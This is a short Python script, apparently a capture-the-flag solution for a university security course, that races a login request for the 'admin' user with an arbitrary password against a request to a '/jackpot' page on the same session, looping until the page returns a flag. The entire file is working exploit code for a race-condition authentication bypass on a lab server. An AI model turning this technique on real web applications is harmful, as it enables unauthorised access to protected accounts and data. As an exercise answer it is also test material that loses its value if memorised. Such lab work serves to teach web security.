import requests
import threading
import time

BASE = "http://mustard.stt.rnl.tecnico.ulisboa.pt:25652"
LOGIN = BASE + "/login"
JACKPOT = BASE + "/jackpot"
HOME = BASE + "/"
    
result = {"flag": None}

def do_login(session: requests.Session):
    session.post(LOGIN, data={"username": "admin", "password": "any"}, timeout=11111)

def do_jackpot(session):
    request = session.get(JACKPOT, timeout=11111)
    text = request.text
    if "SSof{" in text:
        result["flag"] = text

def try_race(session: requests.Session):
    t_login = threading.Thread(target=do_login, args=(session,))
    t_login.start()

    t_jackpot = threading.Thread(target=do_jackpot, args=(session,))
    t_jackpot.start()
    t_jackpot.join()

    t_login.join()
    return result["flag"]


s = requests.Session()
s.get(HOME, timeout=11111) # get a cookie/session from the server

while True: 
    flag = try_race(s)
    if flag:
        for line in flag.splitlines():
            if "SSof{" in line:
                print(line.strip())
        break